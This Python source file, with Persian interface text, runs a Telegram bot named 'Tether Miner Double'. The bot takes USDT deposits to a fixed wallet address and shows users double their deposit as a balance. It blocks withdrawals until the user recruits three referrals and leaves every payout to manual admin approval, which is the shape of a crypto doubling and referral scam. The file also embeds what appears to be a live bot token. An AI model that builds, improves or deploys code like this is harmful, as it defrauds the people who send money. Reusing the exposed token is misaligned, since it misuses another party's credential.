import logging

from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup
)
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler, CallbackQueryHandler,
    ContextTypes, ConversationHandler, filters
)

# -------- تنظیمات --------
TOKEN = "8047284110:AAGLIH-VVWRcTlwimcTQy0zimkiiBKY3vxo"
ADMIN_ID = 6644712689

# -------- وضعیت‌ها --------
DEPOSIT_AMOUNT, DEPOSIT_PROOF, WITHDRAW_AMOUNT, WALLET_ADDRESS, SUPPORT_MESSAGE, ADMIN_REPLY = range(6)

# -------- متغیرهای جهانی --------
user_data = {}
balances = {}

# -------- توابع منو --------
def main_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("Deposit", callback_data="deposit"),
         InlineKeyboardButton("Withdrawal", callback_data="withdraw"),
         InlineKeyboardButton("Balance", callback_data="balance")],
        [InlineKeyboardButton("Referral", callback_data="referral"),
         InlineKeyboardButton("Support", callback_data="support")]
    ])

def back_button(callback_data="menu"):
    return InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data=callback_data)]])

def get_referral_link(user_id):
    return f"https://t.me/TetherMinerDouble_Bot?start={user_id}"

# -------- استارت --------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    if user_id not in user_data:
        user_data[user_id] = {"balance": 0.0, "referrals": []}
    if context.args:
        referrer_id = int(context.args[0])
        if referrer_id != user_id and user_id not in user_data.get(referrer_id, {}).get("referrals", []):
            user_data.setdefault(referrer_id, {"referrals": []})["referrals"].append(user_id)
            await context.bot.send_message(
                referrer_id,
                f"کاربر جدید با نام {user.full_name} از طریق لینک شما عضو شد!"
            )
    await update.message.reply_text("Welcome to Tether Miner Double!", reply_markup=main_menu_keyboard())

# -------- دکمه‌ها --------
async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    match query.data:
        case "menu":
            await query.message.edit_text("بازگشت به منوی اصلی:", reply_markup=main_menu_keyboard())
        case "deposit":
            await query.message.edit_text("چه مقدار دلار می‌خواهید واریز کنید؟\nحداقل واریز ۵ دلار است.",
                                          reply_markup=back_button())
            return DEPOSIT_AMOUNT
        case "withdraw":
            if len(user_data.get(user_id, {}).get("referrals", [])) < 3:
                await query.message.edit_text(
                    f"برای برداشت باید حداقل ۳ زیرمجموعه داشته باشید.\nلینک دعوت:\n{get_referral_link(user_id)}",
                    reply_markup=back_button()
                )
                return ConversationHandler.END
            await query.message.edit_text("چه مقدار می‌خواهید برداشت کنید؟", reply_markup=back_button())
            return WITHDRAW_AMOUNT
        case "balance":
            balance = balances.get(user_id, 0.0)
            await query.message.edit_text(f"موجودی شما: {balance} دلار", reply_markup=back_button())
        case "referral":
            ref_count = len(user_data.get(user_id, {}).get("referrals", []))
            bonus = ref_count * 1.5
            total = balances.get(user_id, 0.0) + bonus
            await query.message.edit_text(
                f"لینک دعوت: {get_referral_link(user_id)}\nزیرمجموعه‌ها: {ref_count}\n"
                f"پاداش کل: {bonus} دلار\nموجودی کل (با جایزه): {total} دلار",
                reply_markup=back_button()
            )
        case "support":
            context.user_data["support_mode"] = True
            await query.message.edit_text("پیغام خود را ارسال کنید:", reply_markup=back_button())
            return SUPPORT_MESSAGE
        case data if data.startswith("confirm_deposit_"):
            _, _, user_id_str, amount_str = data.split("_")
            user_id = int(user_id_str)
            amount = float(amount_str)
            balances[user_id] = balances.get(user_id, 0.0) + (amount * 2)
            await context.bot.send_message(user_id, f"واریز تایید شد. موجودی: {balances[user_id]} دلار")
            await query.message.delete()
        case data if data.startswith("reject_deposit_"):
            _, _, user_id_str = data.split("_")
            await context.bot.send_message(int(user_id_str), "واریز شما رد شد.")
            await query.message.delete()
        case data if data.startswith("confirm_withdraw_"):
            _, _, user_id_str, amount_str, address = data.split("_", 4)
            user_id = int(user_id_str)
            amount = float(amount_str)
            balances[user_id] = balances.get(user_id, 0.0) - amount
            await context.bot.send_message(user_id, "برداشت شما تایید شد.")
            await query.message.delete()
        case data if data.startswith("reject_withdraw_"):
            _, _, user_id_str = data.split("_")
            await context.bot.send_message(int(user_id_str), "برداشت رد شد.")
            await query.message.delete()
        case data if data.startswith("reply_support_"):
            context.user_data["reply_to"] = int(data.split("_")[-1])
            await query.message.reply_text("متن پاسخ را وارد کنید:")
            return ADMIN_REPLY

# -------- واریز --------
async def deposit_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        amount = float(update.message.text)
        if amount < 5:
            await update.message.reply_text("حداقل واریز ۵ دلار است.", reply_markup=main_menu_keyboard())
            return ConversationHandler.END
        context.user_data["deposit_amount"] = amount
        await update.message.reply_text(
            "لطفاً مبلغ را به آدرس زیر واریز کرده و رسید یا لینک تراکنش را ارسال نمایید:\n\n"
            "`0xcD3FcEf99251771a3dc1F6Aa992ff23f1824a1bB`",
            parse_mode="Markdown",
            reply_markup=back_button("deposit")
        )
        return DEPOSIT_PROOF
    except ValueError:
        await update.message.reply_text("عدد نامعتبر است.", reply_markup=back_button("deposit"))
        return ConversationHandler.END

async def deposit_proof(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    amount = context.user_data.get("deposit_amount", 0)
    proof = update.message.text or (update.message.photo[-1].file_id if update.message.photo else "")
    keyboard = [[
        InlineKeyboardButton("تایید", callback_data=f"confirm_deposit_{user_id}_{amount}"),
        InlineKeyboardButton("رد", callback_data=f"reject_deposit_{user_id}")
    ]]
    await context.bot.send_message(
        ADMIN_ID,
        f"درخواست واریز:\nکاربر: {user_id}\nمقدار: {amount}\nمدرک:\n{proof}",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    await update.message.reply_text("در حال بررسی توسط ادمین.")
    return ConversationHandler.END

# -------- برداشت --------
async def withdraw_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        amount = float(update.message.text)
        user_id = update.effective_user.id
        if amount > balances.get(user_id, 0.0):
            await update.message.reply_text("مقدار بیشتر از موجودی است.", reply_markup=main_menu_keyboard())
            return ConversationHandler.END
        context.user_data["withdraw_amount"] = amount
        await update.message.reply_text("آدرس کیف پول خود را وارد کنید:", reply_markup=back_button("withdraw"))
        return WALLET_ADDRESS
    except ValueError:
        await update.message.reply_text("عدد نامعتبر است.", reply_markup=back_button("withdraw"))
        return ConversationHandler.END

async def wallet_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    amount = context.user_data["withdraw_amount"]
    address = update.message.text
    keyboard = [[
        InlineKeyboardButton("تایید", callback_data=f"confirm_withdraw_{user_id}_{amount}_{address}"),
        InlineKeyboardButton("رد", callback_data=f"reject_withdraw_{user_id}")
    ]]
    await context.bot.send_message(
        ADMIN_ID,
        f"درخواست برداشت:\nکاربر: {user_id}\nمقدار: {amount}\nآدرس: {address}",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    await update.message.reply_text("درخواست شما برای بررسی ارسال شد.")
    return ConversationHandler.END

# -------- پشتیبانی --------
async def support_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    msg = update.message.text
    if context.user_data.get("support_mode"):
        context.user_data.pop("support_mode", None)
        await context.bot.send_message(
            ADMIN_ID,
            f"پیام از {user_id}:\n{msg}",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("پاسخ", callback_data=f"reply_support_{user_id}")]
            ])
        )
        await update.message.reply_text("پیام ارسال شد.")
    return ConversationHandler.END

async def admin_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
    reply_text = update.message.text
    user_id = context.user_data.get("reply_to")
    if user_id:
        await context.bot.send_message(user_id, f"پاسخ ادمین:\n{reply_text}")
        await update.message.reply_text("پاسخ ارسال شد.")
    return ConversationHandler.END

# -------- اجرای ربات --------
def main():
    logging.basicConfig(level=logging.INFO)
    app = ApplicationBuilder().token(TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(button)],
        states={
            DEPOSIT_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, deposit_amount)],
            DEPOSIT_PROOF: [MessageHandler(filters.ALL, deposit_proof)],
            WITHDRAW_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, withdraw_amount)],
            WALLET_ADDRESS: [MessageHandler(filters.TEXT & ~filters.COMMAND, wallet_address)],
            SUPPORT_MESSAGE: [MessageHandler(filters.TEXT & ~filters.COMMAND, support_message)],
            ADMIN_REPLY: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_reply)],
        },
        fallbacks=[]
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(conv_handler)
    app.add_handler(CallbackQueryHandler(button))

    app.run_polling()

if __name__ == "__main__":
    main()
